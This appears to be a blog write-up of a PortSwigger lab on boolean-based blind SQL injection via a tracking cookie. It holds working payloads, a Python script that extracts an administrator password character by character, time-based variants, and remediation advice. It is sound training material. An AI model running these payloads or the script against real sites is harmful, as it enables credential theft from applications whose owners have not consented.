---
title: "Blind SQL injection with conditional responses"
date: 2026-06-30 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, boolean, inference]
description: "A PortSwigger Web Security Academy lab where the query result never reaches the page — but a 'Welcome back' message that appears only when a row matches is enough to extract the admin password one character at a time."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection with conditional responses
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) lab is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) that you cannot see. The injectable value is the `TrackingId` cookie, and its query result is never printed anywhere. The only thing that changes is a **"Welcome back"** message: it appears when the lookup returns a row and vanishes when it doesn't. That single difference is enough to read the entire `administrator` password out of the database.

> **Blind SQLi series.** This is the boolean/conditional-response flavour, where a visible message is the oracle. When there is no message, the same attack works off a response delay (time-based) or an unhandled database error ([conditional errors]({% post_url 2026-07-01-Blind-SQL-injection-with-conditional-errors %})). The extraction loop is identical; only the true/false signal changes.
{: .prompt-info }

## The technique

The app looks up your `TrackingId` cookie on every request and concatenates it into a SQL query. Because the result is invisible, this is **blind** SQL injection — but the conditional message gives us a one-bit oracle: ask the database a yes/no question inside the injected query and read the answer off the page.

### Step 1 — confirm the oracle

Send the cookie with a condition that is always true, then one that is always false:

```
TrackingId=<id>' AND '1'='1
```

The response contains "Welcome back". Now the false version:

```
TrackingId=<id>' AND '1'='2
```

The message disappears. Watch the two responses side by side — this is the whole exploit in one picture:

```
Cookie: TrackingId=<id>' AND '1'='1   ->  HTTP/1.1 200 OK   14512 bytes   "Welcome back" PRESENT
Cookie: TrackingId=<id>' AND '1'='2   ->  HTTP/1.1 200 OK   14451 bytes   "Welcome back" ABSENT
```

Both are `200 OK` — the status code never changes, so a naive check would miss it. The signal is in the body: the "Welcome back" block (about 60 bytes) appears only when the injected condition is true. That present-vs-absent difference is the one-bit oracle we read every answer off.

### Step 2 — find the password length

Binary-search the length of the administrator password. The message is present only while the condition is true:

```
TrackingId=<id>' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>N--
```

Adjusting `N` to find the boundary gives a length of **20**.

### Step 3 — extract the password character by character

For each position, binary-search the character's ASCII code (32–126). That costs about 7 requests per character instead of ~95 if you tried every printable value:

```
TrackingId=<id>' AND (SELECT ASCII(SUBSTRING(password,POS,1)) FROM users WHERE username='administrator')>N--
```

A short script automates the whole thing:

```python
import requests

base = "https://<lab-id>.web-security-academy.net/"
tid  = "<trackingid>"

def truth(p):
    return "Welcome back" in requests.get(base, cookies={"TrackingId": tid + p}).text

# length
lo, hi = 1, 60
while lo < hi:
    m = (lo + hi) // 2
    if truth(f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{m}--"):
        lo = m + 1
    else:
        hi = m
n = lo

# each character
pw = ""
for i in range(1, n + 1):
    lo, hi = 32, 126
    while lo < hi:
        m = (lo + hi) // 2
        if truth(f"' AND (SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')>{m}--"):
            lo = m + 1
        else:
            hi = m
    pw += chr(lo)
print(pw)
```

It recovers the 20-character `administrator` password. Log in with it, and the lab is marked **Solved**.

## Why it works

You never need to see query output to steal data. Any application behaviour that differs based on the truth of an injected condition — a message that appears or not, a redirect, an HTTP status, even a response delay — is a usable oracle. Each request leaks one bit; enough requests reconstruct any value. Unreflected inputs like cookies and headers are common homes for blind SQLi precisely because the page can't echo them, so only the conditional branch leaks.

If even a conditional message isn't available, the same idea escalates to **time-based** inference: replace the message check with a response that sleeps when the condition is true — `' AND IF(condition,SLEEP(5),0)--` on MySQL, or `'||pg_sleep(5)--` on PostgreSQL — and measure the delay instead.

## The fix

- **Parameterized queries / prepared statements.** The cookie value must always be bound as data, never concatenated into SQL. This closes the injection regardless of how the result is (or isn't) displayed.
- **Validate the token format.** A `TrackingId` should be an opaque, fixed-shape token; reject anything containing SQL metacharacters.
- **Least privilege.** Run the database account with only the access the app needs, so a successful injection leaks as little as possible.
